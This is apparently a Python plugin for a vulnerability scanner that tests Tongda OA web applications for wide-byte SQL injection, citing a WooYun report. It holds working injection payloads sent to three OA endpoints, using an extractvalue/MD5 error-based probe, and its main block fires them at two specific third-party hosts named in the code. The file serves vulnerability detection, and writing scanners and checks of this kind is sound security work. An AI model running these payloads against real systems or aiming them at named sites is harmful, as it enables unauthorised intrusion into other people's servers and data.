#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0126661
#__Author__ = 上善若水
#_PlugName_ = jixian_sql Plugin
#_FileName_ = jixian_sql.py


def assign(service, arg):
    if service == "tongdaoa":
        return True, arg    

def audit(arg):
    payloads = ('inc/finger/use_finger.php?USER_ID=-1%df','general/ems/manage/search_excel.php?LOGIN_USER_ID=1&EMS_TYPE=1%df','general/ems/query/search_excel.php?LOGIN_USER_ID=1%bf')
    for payload in payloads:
        url = arg + payload + '%27and%20extractvalue(1,%20concat(0x5c,(select%20MD5(520))))%23'
        code, head, res, errcode, _url = curl.curl2(url)
        if code == 200 and 'cf67355a3333e6e143439161adc2d82' in res: 
            security_hole(url)
            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('tongdaoa', 'http://oa.cqiss.com:800/')[1])
    audit(assign('tongdaoa', 'http://oa.cqguoliang.com/')[1])